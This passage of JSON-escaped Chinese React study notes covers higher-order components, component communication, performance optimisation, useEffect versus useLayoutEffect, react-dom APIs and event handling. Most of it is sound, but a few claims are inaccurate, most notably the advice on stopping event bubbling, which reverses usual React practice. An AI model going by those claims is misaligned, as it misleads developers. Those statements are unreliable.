// 某些操作\n    }\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n};\n```\n\n## 7. 常见问题和解决方案\n\n### 7.1. **props 命名冲突**\n\n```jsx\nconst withProps = (WrappedComponent) => {\n  return class extends React.Component {\n    render() {\n      const newProps = {\n        // 使用特定前缀避免冲突\n        withProps_value: 'example'\n      };\n      return <WrappedComponent {...this.props} {...newProps} />;\n    }\n  }\n}\n```\n\n### 7.2. **多个 HOC 的顺序问题**\n\n```jsx\n// HOC 的执行顺序从下到上\nconst enhance = compose(\n  withAuth,      // 第三个执行\n  withLayout,    // 第二个执行\n  withLoading    // 第一个执行\n);\n```\n\n## 8. 替代方案\n\n在某些情况下，可以考虑使用以下替代方案：\n\n1. **Render Props**\n2. **Hooks**\n3. **组件组合**\n\n选择使用 HOC 还是其他方案，应该基于：\n- 代码复用的粒度\n- 性能要求\n- 组件的复杂度\n- 团队的开发习惯\n\nHOC 是一个强大的模式，但不是唯一的解决方案。\n\n在现代 React 开发中，**Hooks 通常是更简单和灵活的选择**。\n\n## 9. 性能考虑\n\n### 9.1. **避免不必要的嵌套**\n\n```javascript\n// ❌ 过度嵌套\nexport default withRouter(connect(mapState)(withStyles(MyComponent)));\n\n// ✅ 使用组合函数\nconst enhance = compose(\n  withRouter,\n  connect(mapState),\n  withStyles\n);\nexport default enhance(MyComponent);\n```\n\n### 9.2. **使用记忆化**\n\n```javascript\nconst memoizedHOC = (WrappedComponent) => {\n  return React.memo((props) => {\n    return <WrappedComponent {...props} />;\n  });\n};\n```\n\n## 10. 高阶组件，为什么静态方法会丢失？\n\n### 10.1. **组件包装的本质**\n\n高阶组件本质上是一个函数，它接受一个组件作为参数，然后返回一个新的组件。这个新组件通常会包装原始组件。例如：\n\n```javascript\nfunction withExampleHOC(WrappedComponent) {\n  return class extends React.Component {\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n}\n```\n\n在这个过程中，**返回的是一个全新的组件类，而不是原始组件的修改版本**\n\n### 10.2. **静态方法不会被继承**\n\nJavaScript 中，静态方法是定义在类本身上，而不是类的原型上。当我们创建一个新的组件类来包装原始组件时，这个==新类并不会自动继承原始组件的静态方法== \n\n### 10.3. **React 的组件模型**\n\nReact 的组件模型主要关注实例方法和生命周期，而不是静态方法。\n当 React 处理组件时，它主要关注组件的 render 方法和生命周期方法，而不会特别处理静态方法\n\n### 10.4. 示例说明\n\n考虑以下例子：\n\n```javascript hl:2\nclass OriginalComponent extends React.Component {\n  static staticMethod() {\n    console.log('This is a static method');\n  }\n\n  render() {\n    return <div>Original Component</div>;\n  }\n}\n\nfunction withHOC(WrappedComponent) {\n  return class extends React.Component {\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n}\n\nconst EnhancedComponent = withHOC(OriginalComponent);\n\n// 这会导致错误，因为 staticMethod 不存在于 EnhancedComponent 上\nEnhancedComponent.staticMethod();\n```\n\n在这个例子中，`EnhancedComponent` 是一个全新的类，它不包含 `OriginalComponent` 的静态方法\n\n### 10.5. 解决方案\n\n#### 10.5.1. **手动复制静态方法**\n\n你可以在 HOC 中手动复制静态方法：\n\n```javascript hl:8\nfunction withHOC(WrappedComponent) {\n  class HOC extends React.Component {\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n  \n  HOC.staticMethod = WrappedComponent.staticMethod;\n  return HOC;\n}\n```\n\n### 10.6. **使用 hoist-non-react-statics**\n\n这就是为什么 `hoist-non-react-statics` 库变得有用。它自动处理静态方法的复制：\n\n```javascript\nimport hoistNonReactStatics from 'hoist-non-react-statics';\n\nfunction withHOC(WrappedComponent) {\n  class HOC extends React.Component {\n    render() {\n      return <WrappedComponent {...this.props} />;\n    }\n  }\n  \n  return hoistNonReactStatics(HOC, WrappedComponent);\n}\n```\n\n这个库会自动复制所有非 React 特定的静态方法，同时避免覆盖 React 特定的静态属性（如 `displayName`、`propTypes` 等）\n\n### 10.7. **使用组合而不是继承**\n\nReact 推荐使用组合而不是继承。在某些情况下，你可以通过组合来避免使用 HOC，从而避免静态方法丢失的问题\n\n### 10.8. 结论\n\n高阶组件中静态方法丢失是由于 JavaScript 的类继承机制和 React 的组件模型共同导致的。\n理解这一点有助于我们更好地设计组件和使用 HOC。\n虽然有多种方法可以解决这个问题，但 `hoist-non-react-statics` 提供了一个简洁和自动化的解决方案，特别是在处理复杂组件或第三方库时。","oBD6RaVP":"\n# React 组件间通信\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Props 传递（父子组件通信）\n- React.createContext\n- 状态管理库\n- 事件总线\n\t- 比如 eventBus\n- 使用 `useRef` 和 `forwardRef` 实现父组件对子组件的直接访问\n- URL 参数\n- strage\n- hooks 组合\n\n## 2. Props 传递（父子组件通信）\n\n最基本也是最常用的通信方式：\n\n```jsx\n// 父组件\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  const handleChildClick = (value) => {\n    console.log('从子组件收到：', value);\n  };\n\n  return (\n    <Child \n      count={count} \n      onIncrement={() => setCount(count + 1)}\n      onChildClick={handleChildClick}\n    />\n  );\n}\n\n// 子组件\nfunction Child({ count, onIncrement, onChildClick }) {\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={onIncrement}>增加</button>\n      <button onClick={() => onChildClick('hello')}>向父组件发送数据</button>\n    </div>\n  );\n}\n```\n\n## 3. Context（跨层级组件通信）\n\n适用于需要在组件树中共享数据的场景：\n\n```jsx\n// 创建 Context\nconst ThemeContext = React.createContext('light');\n\n// 提供者组件\nfunction App() {\n  const [theme, setTheme] = useState('light');\n  \n  return (\n    <ThemeContext.Provider value={{ theme, setTheme }}>\n      <div className=\"app\">\n        <Header />\n        <Main />\n        <Footer />\n      </div>\n    </ThemeContext.Provider>\n  );\n}\n\n// 消费者组件（使用 useContext Hook）\nfunction ThemedButton() {\n  const { theme, setTheme } = useContext(ThemeContext);\n  \n  return (\n    <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>\n      Current theme: {theme}\n    </button>\n  );\n}\n\n// 或使用 Consumer 组件\nfunction ThemedButton() {\n  return (\n    <ThemeContext.Consumer>\n      {({ theme, setTheme }) => (\n        <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>\n          Current theme: {theme}\n        </button>\n      )}\n    </ThemeContext.Consumer>\n  );\n}\n```\n\n## 4. 状态管理库（全局状态管理）\n\n使用 Redux、MobX 或 Zustand 等状态管理库：\n\n```jsx\n// Redux 示例\n// store.js\nimport { createSlice, configureStore } from '@reduxjs/toolkit';\n\nconst counterSlice = createSlice({\n  name: 'counter',\n  initialState: { value: 0 },\n  reducers: {\n    increment: state => { state.value += 1 },\n    decrement: state => { state.value -= 1 }\n  }\n});\n\nexport const store = configureStore({\n  reducer: {\n    counter: counterSlice.reducer\n  }\n});\n\n// App.js\nimport { Provider } from 'react-redux';\nimport { store } from './store';\n\nfunction App() {\n  return (\n    <Provider store={store}>\n      <Counter />\n    </Provider>\n  );\n}\n\n// Counter.js\nimport { useSelector, useDispatch } from 'react-redux';\n\nfunction Counter() {\n  const count = useSelector(state => state.counter.value);\n  const dispatch = useDispatch();\n\n  return (\n    <div>\n      <button onClick={() => dispatch(increment())}>+</button>\n      <span>{count}</span>\n      <button onClick={() => dispatch(decrement())}>-</button>\n    </div>\n  );\n}\n```\n\n## 5. 自定义事件（发布-订阅模式）\n\n适用于非父子组件间的通信：\n\n```jsx\n// eventBus.js\nclass EventBus {\n  constructor() {\n    this.events = {};\n  }\n\n  on(eventName, callback) {\n    if (!this.events[eventName]) {\n      this.events[eventName] = [];\n    }\n    this.events[eventName].push(callback);\n  }\n\n  emit(eventName, data) {\n    if (this.events[eventName]) {\n      this.events[eventName].forEach(callback => callback(data));\n    }\n  }\n\n  off(eventName, callback) {\n    if (this.events[eventName]) {\n      this.events[eventName] = this.events[eventName]\n        .filter(cb => cb !== callback);\n    }\n  }\n}\n\nexport const eventBus = new EventBus();\n\n// ComponentA.js\nfunction ComponentA() {\n  const sendMessage = () => {\n    eventBus.emit('message', 'Hello from A!');\n  };\n\n  return <button onClick={sendMessage}>Send Message</button>;\n}\n\n// ComponentB.js\nfunction ComponentB() {\n  const [message, setMessage] = useState('');\n\n  useEffect(() => {\n    const handleMessage = (msg) => setMessage(msg);\n    eventBus.on('message', handleMessage);\n    \n    return () => eventBus.off('message', handleMessage);\n  }, []);\n\n  return <div>Received: {message}</div>;\n}\n```\n\n## 6. Refs 传递（父组件访问子组件）\n\n使用 `useRef` 和 `forwardRef` 实现父组件对子组件的直接访问：\n\n```jsx\n// 子组件\nconst ChildComponent = forwardRef((props, ref) => {\n  const childMethod = () => {\n    console.log('Child method called');\n  };\n\n  useImperativeHandle(ref, () => ({\n    childMethod\n  }));\n\n  return <div>Child Component</div>;\n});\n\n// 父组件\nfunction ParentComponent() {\n  const childRef = useRef();\n\n  const handleClick = () => {\n    childRef.current.childMethod();\n  };\n\n  return (\n    <div>\n      <ChildComponent ref={childRef} />\n      <button onClick={handleClick}>Call Child Method</button>\n    </div>\n  );\n}\n```\n\n## 7. URL 参数（路由通信）\n\n通过 URL 参数在组件间传递数据：\n\n```jsx\n// 使用 React Router\nimport { useNavigate, useParams, useSearchParams } from 'react-router-dom';\n\n// 发送组件\nfunction ComponentA() {\n  const navigate = useNavigate();\n\n  const handleClick = () => {\n    navigate('/component-b/123?name=test');\n  };\n\n  return <button onClick={handleClick}>Go to B</button>;\n}\n\n// 接收组件\nfunction ComponentB() {\n  const { id } = useParams();\n  const [searchParams] = useSearchParams();\n  const name = searchParams.get('name');\n\n  return (\n    <div>\n      <p>ID: {id}</p>\n      <p>Name: {name}</p>\n    </div>\n  );\n}\n```\n\n## 8. localStorage/sessionStorage\n\n通过浏览器存储实现组件通信：\n\n```jsx\n// ComponentA\nfunction ComponentA() {\n  const saveData = () => {\n    localStorage.setItem('sharedData', JSON.stringify({ message: 'Hello!' }));\n    // 触发自定义事件通知其他组件\n    window.dispatchEvent(new Event('storage-update'));\n  };\n\n  return <button onClick={saveData}>Save Data</button>;\n}\n\n// ComponentB\nfunction ComponentB() {\n  const [data, setData] = useState(null);\n\n  useEffect(() => {\n    const handleStorage = () => {\n      const storedData = localStorage.getItem('sharedData');\n      if (storedData) {\n        setData(JSON.parse(storedData));\n      }\n    };\n\n    window.addEventListener('storage-update', handleStorage);\n    return () => window.removeEventListener('storage-update', handleStorage);\n  }, []);\n\n  return <div>Stored Message: {data?.message}</div>;\n}\n```\n\n## 9. 组合组件（Compound Components）\n\n通过组件组合模式实现组件间通信：\n\n```jsx\n// 创建 Context\nconst TabContext = React.createContext();\n\n// 父组件\nfunction Tabs({ children, defaultIndex = 0 }) {\n  const [activeIndex, setActiveIndex] = useState(defaultIndex);\n\n  return (\n    <TabContext.Provider value={{ activeIndex, setActiveIndex }}>\n      <div className=\"tabs\">{children}</div>\n    </TabContext.Provider>\n  );\n}\n\n// 子组件\nfunction TabList({ children }) {\n  return <div className=\"tab-list\">{children}</div>;\n}\n\nfunction Tab({ index, children }) {\n  const { activeIndex, setActiveIndex } = useContext(TabContext);\n  \n  return (\n    <button\n      className={activeIndex === index ? 'active' : ''}\n      onClick={() => setActiveIndex(index)}\n    >\n      {children}\n    </button>\n  );\n}\n\nfunction TabPanel({ index, children }) {\n  const { activeIndex } = useContext(TabContext);\n  \n  if (activeIndex !== index) return null;\n  return <div className=\"tab-panel\">{children}</div>;\n}\n\n// 使用示例\nfunction App() {\n  return (\n    <Tabs>\n      <TabList>\n        <Tab index={0}>Tab 1</Tab>\n        <Tab index={1}>Tab 2</Tab>\n      </TabList>\n      <TabPanel index={0}>Content 1</TabPanel>\n      <TabPanel index={1}>Content 2</TabPanel>\n    </Tabs>\n  );\n}\n```\n\n","L4KQZ6eW":"\n# React 性能优化的思路\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 记得使用 React Devtools 分析性能\n- ssr 首屏\n- 渲染\n\t- 缓存\n\t- 避免重复渲染\n\t- 列表 key\n\t- 虚拟列表\n- IO\n\t- 代码分割\n\t- 懒加载\n\t- 预加载\n- 长任务优化\n\n## 2. 组件渲染优化\n\n### 2.1. 使用 React.memo 避免不必要的重渲染\n\n```javascript\n// 使用 React.memo 包装函数组件\nconst MyComponent = React.memo(function MyComponent(props) {\n  /* 渲染逻辑 */\n  return (\n    // ...\n  );\n}, (prevProps, nextProps) => {\n  // 可选的比较函数，返回 true 则不重新渲染\n  return prevProps.id === nextProps.id;\n});\n\n// 对于类组件，可以使用 PureComponent\nclass MyPureComponent extends React.PureComponent {\n  render() {\n    return (\n      // ...\n    );\n  }\n}\n```\n\n### 2.2. 使用 useMemo 缓存计算结果\n\n```javascript\nfunction ExpensiveComponent({ data }) {\n  // 缓存计算结果\n  const processedData = useMemo(() => {\n    return data.map(item => expensiveOperation(item));\n  }, [data]); // 只在 data 改变时重新计算\n\n  return (\n    <div>\n      {processedData.map(item => (\n        <div key={item.id}>{item.value}</div>\n      ))}\n    </div>\n  );\n}\n```\n\n### 2.3. 使用 useCallback 缓存函数\n\n```javascript\nfunction ParentComponent() {\n  const [count, setCount] = useState(0);\n\n  // 缓存回调函数\n  const handleClick = useCallback(() => {\n    setCount(c => c + 1);\n  }, []); // 空依赖数组，函数永远不会改变\n\n  return <ChildComponent onClick={handleClick} />;\n}\n```\n\n## 3. 列表渲染优化\n\n### 3.1. 使用合适的 key\n\n```javascript\n// ❌ 错误示例：使用索引作为 key\n{items.map((item, index) => (\n  <ListItem key={index} item={item} />\n))}\n\n// ✅ 正确示例：使用唯一标识符作为 key\n{items.map(item => (\n  <ListItem key={item.id} item={item} />\n))}\n```\n\n### 3.2. 虚拟列表\n\n使用 `react-window` 或 `react-virtualized` 处理长列表：\n\n```javascript\nimport { FixedSizeList } from 'react-window';\n\nfunction VirtualList({ items }) {\n  const Row = ({ index, style }) => (\n    <div style={style}>\n      {items[index].name}\n    </div>\n  );\n\n  return (\n    <FixedSizeList\n      height={400}\n      width={300}\n      itemCount={items.length}\n      itemSize={35}\n    >\n      {Row}\n    </FixedSizeList>\n  );\n}\n```\n\n## 4. 状态管理优化\n\n### 4.1. 合理拆分状态\n\n```javascript\n// ❌ 错误示例：所有状态放在一起\nconst [state, setState] = useState({\n  user: null,\n  posts: [],\n  comments: [],\n  settings: {}\n});\n\n// ✅ 正确示例：拆分状态\nconst [user, setUser] = useState(null);\nconst [posts, setPosts] = useState([]);\nconst [comments, setComments] = useState([]);\nconst [settings, setSettings] = useState({});\n```\n\n### 4.2. 使用 useReducer 管理复杂状态\n\n```javascript\nconst initialState = { count: 0 };\n\nfunction reducer(state, action) {\n  switch (action.type) {\n    case 'increment':\n      return { count: state.count + 1 };\n    case 'decrement':\n      return { count: state.count - 1 };\n    default:\n      return state;\n  }\n}\n\nfunction Counter() {\n  const [state, dispatch] = useReducer(reducer, initialState);\n  return (\n    <>\n      Count: {state.count}\n      <button onClick={() => dispatch({ type: 'increment' })}>+</button>\n      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>\n    </>\n  );\n}\n```\n\n## 5. 代码分割和懒加载\n\n### 5.1. 使用 React.lazy 和 Suspense\n\n```javascript\nconst OtherComponent = React.lazy(() => import('./OtherComponent'));\n\nfunction MyComponent() {\n  return (\n    <Suspense fallback={<Loading />}>\n      <OtherComponent />\n    </Suspense>\n  );\n}\n```\n\n### 5.2. 路由级别的代码分割\n\n```javascript\nimport { BrowserRouter, Routes, Route } from 'react-router-dom';\nimport React, { Suspense } from 'react';\n\nconst Home = React.lazy(() => import('./routes/Home'));\nconst About = React.lazy(() => import('./routes/About'));\nconst Contact = React.lazy(() => import('./routes/Contact'));\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <Suspense fallback={<div>Loading...</div>}>\n        <Routes>\n          <Route path=\"/\" element={<Home />} />\n          <Route path=\"/about\" element={<About />} />\n          <Route path=\"/contact\" element={<Contact />} />\n        </Routes>\n      </Suspense>\n    </BrowserRouter>\n  );\n}\n```\n\n## 6. 避免重复渲染\n\n### 6.1. 使用 CSS 代替 JS 动画\n\n```javascript\n// ❌ 使用 JS 动画\nfunction AnimatedComponent() {\n  const [position, setPosition] = useState(0);\n  \n  useEffect(() => {\n    const animation = setInterval(() => {\n      setPosition(p => p + 1);\n    }, 16);\n    return () => clearInterval(animation);\n  }, []);\n\n  return <div style={{ transform: `translateX(${position}px)` }} />;\n}\n\n// ✅ 使用 CSS 动画\nconst AnimatedComponent = styled.div`\n  animation: slide 1s linear infinite;\n  \n  @keyframes slide {\n    from { transform: translateX(0); }\n    to { transform: translateX(100px); }\n  }\n`;\n```\n\n### 6.2. 使用防抖和节流\n\n```javascript\nimport { debounce, throttle } from 'lodash';\n\nfunction SearchComponent() {\n  // 使用防抖处理搜索\n  const debouncedSearch = useCallback(\n    debounce((query) => {\n      // 执行搜索\n      performSearch(query);\n    }, 300),\n    []\n  );\n\n  // 使用节流处理滚动\n  const throttledScroll = useCallback(\n    throttle((event) => {\n      // 处理滚动\n      handleScroll(event);\n    }, 100),\n    []\n  );\n\n  useEffect(() => {\n    window.addEventListener('scroll', throttledScroll);\n    return () => window.removeEventListener('scroll', throttledScroll);\n  }, [throttledScroll]);\n\n  return (\n    <input\n      type=\"text\"\n      onChange={(e) => debouncedSearch(e.target.value)}\n    />\n  );\n}\n```\n\n## 7. 优化资源加载\n\n### 7.1. 图片懒加载\n\n```javascript\nfunction ImageComponent({ src, alt }) {\n  const imgRef = useRef();\n\n  useEffect(() => {\n    const observer = new IntersectionObserver(\n      (entries) => {\n        entries.forEach(entry => {\n          if (entry.isIntersecting) {\n            imgRef.current.src = src;\n            observer.disconnect();\n          }\n        });\n      },\n      { threshold: 0.1 }\n    );\n\n    if (imgRef.current) {\n      observer.observe(imgRef.current);\n    }\n\n    return () => observer.disconnect();\n  }, [src]);\n\n  return <img ref={imgRef} alt={alt} />;\n}\n```\n\n### 7.2. 预加载关键资源\n\n```javascript\nfunction App() {\n  useEffect(() => {\n    // 预加载重要图片\n    const preloadImages = ['/logo.png', '/hero.jpg'];\n    preloadImages.forEach(src => {\n      const img = new Image();\n      img.src = src;\n    });\n\n    // 预加载其他组件\n    const preloadComponent = () => import('./HeavyComponent');\n  }, []);\n\n  return (\n    // ...\n  );\n}\n```\n\n## 8. 工具和监控\n\n### 8.1. 使用 React DevTools 进行性能分析\n\n```javascript\n// 开发环境中使用 Profiler\nimport { Profiler } from 'react';\n\nfunction onRenderCallback(\n  id, // 发生提交的 Profiler 树的 \"id\"\n  phase, // \"mount\" （首次渲染）或 \"update\" （重新渲染）\n  actualDuration, // 本次更新在渲染完成之前耗费的时间\n  baseDuration, // 估计不使用 memoization 的情况下渲染整颗子树需要的时间\n  startTime, // 本次更新开始渲染的时间\n  commitTime, // 本次更新被提交的时间\n  interactions // 属于本次更新的 interactions 的集合\n) {\n  // 记录或上报性能数据\n  console.log(`${id} 渲染耗时: ${actualDuration}`);\n}\n\nfunction MyApp() {\n  return (\n    <Profiler id=\"App\" onRender={onRenderCallback}>\n      <App />\n    </Profiler>\n  );\n}\n```\n\n## 9. 其他优化建议\n\n- **合理使用 Context**\n\t- 避免将频繁变化的值放在 Context 中\n\t- 考虑拆分 Context 以减少不必要的重渲染\n- **使用 Web Workers 处理复杂计算**\n   ```javascript\n   const worker = new Worker('worker.js');\n   \n   worker.postMessage({ data: complexData });\n   worker.onmessage = (event) => {\n     setResult(event.data);\n   };\n   ```\n\n- **优化依赖包大小**\n\t- 使用 `import` 语法进行按需加载\n\t- 使用较小的替代包\n\t- 定期审查和更新依赖\n- **服务端渲染 (SSR)**\n\t- 考虑使用 Next.js 或其他 SSR 框架\n\t- 实现首屏快速加载\n\t- 优化 SEO\n- **使用性能监控工具**\n\t- React DevTools\n\t- Chrome Performance 面板\n\t- Lighthouse\n\t- 自定义性能指标监控\n","OerYKo4t":"\n# useLayoutEffect 和 useEffect\n\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- useEffect：\n\t- 渲染完成后执行\n- useLayoutEffect\n\t- 渲染完成前同步执行\n\t- **类似 Vue 的 watch ，并参入参数 `sync\n- 顺序说明\n\t1. React 更新 DOM\n\t2. `useLayoutEffect` 执行\n\t3. 浏览器绘制屏幕\n\t\t- 区别在于：==是否在浏览器绘制之前执行==\n\t4. `useEffect` 执行\n- 区别\n\t- ![图片&文件](./files/20241231-1.png)\n- 使用 useLayoutEffect 的场景\n\t- 需要==同步测量 DOM==\n\t- 需要在==视觉更新之前==修改 DOM\n\t- 出现==闪烁==问题需要解决\n\n## 2. 执行时机的区别\n\n```jsx\n// useEffect：渲染完成后异步执行\nuseEffect(() => {\n  // 在浏览器完成绘制之后执行\n  console.log('useEffect 执行');\n}, []);\n\n// useLayoutEffect：渲染完成前同步执行\nuseLayoutEffect(() => {\n  // 在浏览器绘制之前执行\n  console.log('useLayoutEffect 执行');\n}, []);\n```\n\n执行顺序：\n\n1. React 更新 DOM\n2. `useLayoutEffect` 执行\n3. 浏览器绘制屏幕\n4. `useEffect` 执行\n\n## 3. 性能影响\n\n### 3.1. useEffect\n\n```jsx hl:2\nuseEffect(() => {\n  // 异步执行，不会阻塞浏览器绘制\n  expensiveOperation();\n}, []);\n```\n\n### 3.2. useLayoutEffect\n\n```jsx hl:2\nuseLayoutEffect(() => {\n  // 同步执行，会阻塞浏览器绘制\n  expensiveOperation();\n}, []);\n```\n\n## 4. 使用场景\n\n### 4.1. useLayoutEffect 适用场景\n\n```jsx hl:1,7\n// 1. 需要立即测量 DOM 的场景\nuseLayoutEffect(() => {\n  const dimensions = element.getBoundingClientRect();\n  setMeasurements(dimensions);\n}, []);\n\n// 2. 防止闪烁的场景\nuseLayoutEffect(() => {\n  element.style.opacity = 1; // 在用户看到之前就完成设置\n}, []);\n```\n\n### 4.2. useEffect 适用场景\n\n```jsx hl:1,6\n// 1. 数据获取\nuseEffect(() => {\n  fetchData().then(data => setData(data));\n}, []);\n\n// 2. 订阅事件\nuseEffect(() => {\n  const handler = () => console.log('scroll');\n  window.addEventListener('scroll', handler);\n  return () => window.removeEventListener('scroll', handler);\n}, []);\n```\n\n## 5. 关键区别总结（表格）\n\n| 特性    | useEffect | useLayoutEffect |\n| ----- | --------- | --------------- |\n| 执行时机  | 渲染后异步执行   | 渲染前同步执行         |\n| 浏览器绘制 | 不阻塞       | 阻塞              |\n| 性能影响  | 较小        | 可能较大            |\n| 适用场景  | 大多数副作用    | DOM 测量和更新       |\n|       |           |                 |\n\n## 6. 最佳实践\n\n### 6.1. 默认使用 useEffect\n\n```jsx\n// 大多数情况下使用 useEffect 即可\nuseEffect(() => {\n  // 副作用代码\n}, [dependencies]);\n```\n\n### 6.2. 仅在必要时使用 useLayoutEffect\n\n```jsx hl:1\n// 当需要同步更新 DOM 或防止闪烁时\nuseLayoutEffect(() => {\n  // DOM 操作代码\n}, [dependencies]);\n```\n\n## 7. 常见问题和解决方案\n\n### 7.1. 闪烁问题\n\n```jsx\n// 问题代码\nconst [position, setPosition] = useState(0);\nuseEffect(() => {\n  setPosition(100); // 可能导致闪烁\n}, []);\n\n// 解决方案\nuseLayoutEffect(() => {\n  setPosition(100); // 不会闪烁\n}, []);\n```\n\n### 7.2. 性能问题\n\n```jsx hl:6,3\n// 避免在 useLayoutEffect 中进行耗时操作\nuseLayoutEffect(() => {\n  // 不推荐\n  heavyComputation();\n  \n  // 推荐：移到 useEffect 中\n  requestAnimationFrame(() => {\n    heavyComputation();\n  });\n}, []);\n```\n\n## 8. 注意事项\n\n- SSR（服务器端渲染）注意事项：\n\n```jsx\n// useLayoutEffect 在 SSR 中会警告\n// 可以使用条件判断\nconst useIsomorphicLayoutEffect = \n  typeof window !== 'undefined' ? useLayoutEffect : useEffect;\n```\n\n- 避免过度使用：\n\n```jsx\n// 不推荐\nuseLayoutEffect(() => {\n  // 非必要的同步操作\n  setSimpleState(newValue);\n}, []);\n\n// 推荐\nuseEffect(() => {\n  // 使用 useEffect 即可\n  setSimpleState(newValue);\n}, []);\n```\n\n## 9. 选择建议\n\n- 默认使用 `useEffect`\n- 当**出现以下情况时考虑使用 useLayoutEffect**：\n\t- 需要同**步测量 DOM**\n\t- 需要**在视觉更新之前修改 DOM**\n\t- 出现**闪烁**问题需要解决\n- 在使用 `useLayoutEffect` 时注意性能影响\n","IGNP2dtX":"\n# react-dom\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- ReactDOM.render()\n\t- 不可中断\n- ReactDOM.createRoot(container)\n\t- 支持并发渲染\n- ReactDOM.unmountComponentAtNode()\n\t- 从 DOM 中移除已挂载的 React 组件\n- 服务器相关\n\t- ReactDOM.hydrate()\n\t- ReactDOMServer.renderToString()\n- ReactDOM.createPortal(child, container)\n- ReactDOM.findDOMNode(component)\n\n## 2. 基本作用\n\n- react-dom 是 React 的配套库，**主要负责将 React 组件渲染到浏览器的 DOM 中**\n- 它是连接 React `虚拟 DOM` 和 `实际浏览器 DOM` 的桥梁\n- 从 React 16 开始，React 被拆分为 `react 核心库` 和 `react-dom` 两个包\n\n## 3. 常用方法\n\n### 3.1. ReactDOM.render()\n\n```jsx\nReactDOM.render(element, container[, callback])\n```\n\n- 用于将 React 元素渲染到指定的 DOM 容器中\n- 返回对组件的引用\n- 这是最基础也是最常用的方法 \n\n### 3.2. ReactDOM.createRoot()\n\n```jsx\nconst root = ReactDOM.createRoot(container)\nroot.render(element)\n```\n\n- React 18 中引入的新 API\n- 用于创建一个根节点，支持`并发渲染`特性\n\n### 3.3. ReactDOM.unmountComponentAtNode()\n\n```jsx\nReactDOM.unmountComponentAtNode(container)\n```\n\n- 从 DOM 中移除已挂载的 React 组件\n- 清理组件的事件处理器和 state\n\n### 3.4. ReactDOM.findDOMNode()\n\n```jsx\nReactDOM.findDOMNode(component)\n```\n\n- 用于获取已挂载组件的 DOM 节点\n- 注意：这个方法在严格模式下已被废弃\n\n## 4. 服务器端渲染方法\n\n- `ReactDOM.hydrate()`：用于服务器端渲染的水合过程\n- `ReactDOMServer.renderToString()`：将 React 组件渲染为初始 HTML\n\n## 5. Portal 相关\n\n- 允许将子节点渲染到存在于父组件以外的 DOM 节点中\n- 常用于模态框、弹出层等场景\n\n```jsx\nReactDOM.createPortal(child, container)\n```\n\n## 6. 特点和注意事项\n\n- react-dom 是专门用于 Web 平台的包\n- 移动端开发需要使用 react-native 而不是 react-dom\n- 在现代 React 应用中，**推荐使用 createRoot API 而不是传统的 render 方法**\n\n## 7. 使用示例\n\n```jsx\n// 传统方式\nimport ReactDOM from 'react-dom';\nReactDOM.render(<App />, document.getElementById('root'));\n\n// React 18 方式\nimport ReactDOM from 'react-dom/client';\nconst root = ReactDOM.createRoot(document.getElementById('root'));\nroot.render(<App />);\n```\n","fzY9DIRJ":"\n# React 事件系统\n\n`#react` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- React 实现了一个==合成事件层== ，将浏览器原生事件统一封装为==合成事件==\n- React 利用==事件委托机制==将大多数事件都==委托到 document 节点上==\n\t- React 17 之后改为 `root 节点`\n- React 在内部维护一个==事件对象池==\n\t- 复用事件对象以减少内存分配和垃圾回收，React 17 完全移除了事件池机制\n\t- 所以 无需调用 `e.persist()`\n- 类组件中使用箭头函数自动绑定 this\n\t- 否则需要使用 `.bind` \n- 函数组件中使用 `useCallback` 优化事件处理函数\n- 使用防抖或节流优化性能，及时清理不需要的事件监听器\n- React 事件和原生事件的执行顺序，==比想象中更复杂些，见下面示例==\n- 事件命名规范\n\t- ==原生事件全小写==：`onclick`、`onblur`\n\t- React 事件采用驼峰：`onClick`、`onBlur`\n- 阻止默认行为\n\t- e.preventDefault()\n\t- ==不是 不是 return false==\n- 阻止事件冒泡\n\t- ==原生事件==使用 `e.stopPropagation()`\n\t- ==React 事件==使用 `e.nativeEvent.stopPropagation()`\n- 处理文档级事件、自定义事件等特殊场景\n- 利用开发环境调试工具检查事件绑定情况，了解事件触发顺序\n- 合理使用==事件委托==，缓存事件处理函数以提高性能\n\n## 2. 执行顺序：==重点==\n\n```jsx\nfunction EventOrderExample() {\n  useEffect(() => {\n    // document 事件\n    document.addEventListener('click', () => {\n      console.log('1. document 捕获');\n    }, true);\n    \n    document.addEventListener('click', () => {\n      console.log('9. document 冒泡');\n    });\n\n    // root 容器事件\n    const root = document.getElementById('root');\n    root.addEventListener('click', () => {\n      console.log('2. root 捕获（原生）');\n    }, true);\n    \n    root.addEventListener('click', () => {\n      console.log('8. root 冒泡（原生）');\n    });\n\n    // div 元素事件\n    const div = document.querySelector('.container');\n    div.addEventListener('click', () => {\n      console.log('3. div 捕获（原生）');\n    }, true);\n    \n    div.addEventListener('click', () => {\n      console.log('7. div 冒泡（原生）');\n    });\n\n    // button 元素事件\n    const button = document.querySelector('button');\n    button.addEventListener('click', () => {\n      console.log('4. button 捕获（原生）');\n    }, true);\n    \n    button.addEventListener('click', () => {\n      console.log('5. button 目标');\n    });\n    \n    button.addEventListener('click', () => {\n      console.log('6. button 冒泡（原生）');\n    });\n\n    // 清理函数\n    return () => {\n      // ... 清理所有事件监听\n    };\n  }, []);\n\n  // React 事件处理\n  const handleDivCapture = () => {\n    console.log('10. React div 捕获');\n  };\n\n  const handleButtonClick = () => {\n    console.log('11. React button 目标');\n  };\n\n  const handleDivBubble = () => {\n    console.log('12. React div 冒泡');\n  };\n\n  return (\n    <div \n      className=\"container\" \n      onClick={handleDivBubble} \n      onClickCapture={handleDivCapture}\n    >\n      <button onClick={handleButtonClick}>\n        点击测试事件顺序\n      </button>\n    </div>\n  );\n}\n```\n\n> [!danger]\n> ==和自己想象中的顺序不一样==\n\n\n![图片&文件](./files/20250101.png)\n\n## 3. React 